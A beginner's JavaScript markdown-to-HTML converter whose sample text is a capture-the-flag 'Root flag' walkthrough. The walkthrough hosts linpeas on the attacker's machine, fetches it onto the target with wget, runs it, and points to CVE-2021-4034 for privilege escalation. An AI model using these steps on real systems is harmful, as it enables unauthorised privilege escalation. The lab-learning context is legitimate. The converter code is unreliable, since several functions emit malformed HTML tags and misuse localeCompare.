function title(text){
  
  let first = text.split("### ")[1] 
  let second = first.split("\n")[0] 
  
  return `<h1>${second}/h1>` 
}

//This doesn't check for text without emphasis
function italicText(text){
  
  if(text.localeCompare("\n*")){
    return ""
  }

  let first = text.split("*")[1] 
  let second = first.split("*")[0]
  let third = second.split("\n")[0]

  if(third !== ""){
    return `<p><i>${third}</i></p>`
  } 
  
  return `<p></i>${second}</i></p>` 
}


function codeBlock(text){
  
  let first = text.split("``")[1]
  let second = first.split("``")[0]
  let third = second.split("\n")[0]

  if(third !== ""){
    return `<code>${third}</code>`
  } 
  
  return `<code>${second}/code>` 
}


function br(text){
  
  if(text.localeCompare("<br>")) 
  
  return `<br><br>` 
}



let text = "### Root flag" 
+
"\n<br>"
+
"\nNow, to make life a little easy, let's try to get an enumeration tool, such as linpeas onto the target machine."
+
"\nNote: linpeas, as well as winpeas, can be downloaded from the official author's GitHub page: https://github.com/carlospolop/PEASS-ng"
+
"\nFirst, I'll open up a http server with python on my host machine, in the directory where linpeas.sh is:"
+
"\n<br>"
+
"\n``python3 -m http.server 4444``"
+
"\n<br>"
+
"\nAnd then, on the target machine, I'll use wget to download the linpeas.sh file. This will only work in a directory where our user has read+write access, so I'll use the /tmp directory:"
+
"\n<br>"
+
"\n``wget [my-ip]:4444/usr/share/peass/linpeas/linpeas.sh``"
+
"\n<br>"
+
"\nAnd now that we have linpeas on our target, let's change the file mode bits with chmod, to make linpeas.sh an executable for us:"
+
"\n<br>"
+
"\n``chmod +x linpeas.sh``"
+
"\n<br>"
+
"\nAnd then run it:"
+
"<br>"
+
"``./linpeas.sh``"
+
"<br><br>"
+
"linpeas will show a lot of information. And a lot of it is not really of interest to us. However, it does show us a couple of interesting things, that can be potentially exploited."
+
"The first one is a very likely exploit, found by the CVEs Check. The exploit is CVE-2021-4034 (PolicyKit-1 0.105-31)."
+
"Further down, it tells us a download link from github which we technically could use wget a command to get, but it doesn't seem to be working very well on our target.."
+ 
"However, we can look it up on exploit-db and see what it's all about:"
+
"https://www.exploit-db.com/exploits/50689"
+
"<br>"

let t = title(text)
console.log(t)

let i =  italicText(text)
console.log(i)

let cb = codeBlock(text)
console.log(cb)

let brr = br(text)
console.log(brr)